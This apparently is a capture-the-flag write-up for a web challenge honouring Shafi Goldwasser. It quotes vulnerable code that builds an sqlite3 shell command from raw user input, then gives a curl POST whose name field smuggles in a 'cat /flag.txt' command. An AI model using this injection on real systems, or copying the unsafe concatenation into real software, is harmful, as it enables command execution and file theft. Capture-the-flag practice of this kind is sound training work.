# Shaffi Goldwater

## Prompt

[Shafrira Goldwasser](https://en.wikipedia.org/wiki/Shafi_Goldwasser) (Hebrew: שפרירה גולדווסר; born 1959) is an Israeli-American computer scientist and winner of the Turing Award in 2012. She is the RSA Professor of Electrical Engineering and Computer Science at Massachusetts Institute of Technology; a professor of mathematical sciences at the Weizmann Institute of Science, Israel; the director of the Simons Institute for the Theory of Computing at the University of California, Berkeley; and co-founder and chief scientist of Duality Technologies.

Chal: I mad this [webapp](https://cyberheroines-web-srv4.chals.io/) but I couldnt prove it was secure. In honor of [this Turing Award winner](https://www.youtube.com/watch?v=DfJ8W49R0rI), prove it is zero secure by returning the flag.


## Solution

Command Injection (into a prepared sql statement) ``query = 'sqlite3 database.db "SELECT biography FROM cyberheroines WHERE name=\'' + str(name) +'\'\"'``

You can bring back the flag with ``curl -X POST -d "heroine_name=AdaLovelace\"%20;%20cat%20/flag.txt;echo%20\"" https://cyberheroines-web-srv4.chals.io``

